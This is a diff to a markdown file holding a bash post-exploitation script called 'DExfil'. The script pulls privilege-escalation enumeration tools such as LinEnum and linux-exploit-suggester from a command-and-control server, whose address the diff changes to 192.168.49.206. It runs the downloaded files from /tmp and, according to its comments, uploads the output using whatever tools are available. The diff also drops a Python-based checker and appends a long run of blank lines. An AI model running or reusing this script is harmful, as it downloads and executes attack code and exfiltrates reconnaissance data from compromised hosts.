@@ -1,4 +1,4 @@
-# Linux Discovery Script
+# Linux Discovery Script (DExfil)
 ```bash
 #!/bin/bash
 #set -x
@@ -10,10 +10,10 @@ SHELL=/bin/bash;
 fi
 
 host_ip=$(hostname -I)
-C2=127.0.0.1
+C2=192.168.49.206
 export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
 # files to pull from C2 server
-declare -a enum_scripts=("LinEnum.sh" "linuxprivchecker.py" "linux-exploit-suggester.sh" "unix-privesc-check")
+declare -a enum_scripts=("LinEnum.sh" "linux-exploit-suggester.sh" "unix-privesc-check")
 
 #if wget, use that, or case
 
@@ -62,16 +62,6 @@ for filename in /tmp/*;
                     chmod +rwx "$filename"
                     $SHELL "$filename" > "${filename}"_0utF_$host_ip
                     ;;
-            /tmp/linuxprivchecker.py)  # should probably check for py b4 dl
-                 declare -a python_cmds=("python" "python2" "python3")
-                 for p_cmd in {python_cmds[@]}; do #find python shell
-                        if $p_cmd -v python &> /dev/null; then
-                        $p_cmd $filename -w -o ${filename}_0utF_$host_ip;
-                        break        #quit after first successful execution
-                        else
-                        echo "$p_cmd not found";
-                        fi
-                  ;;
     esac;
 done
 #case statement: upload depending on available tools
@@ -115,3 +105,89 @@ done
 
 
 ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
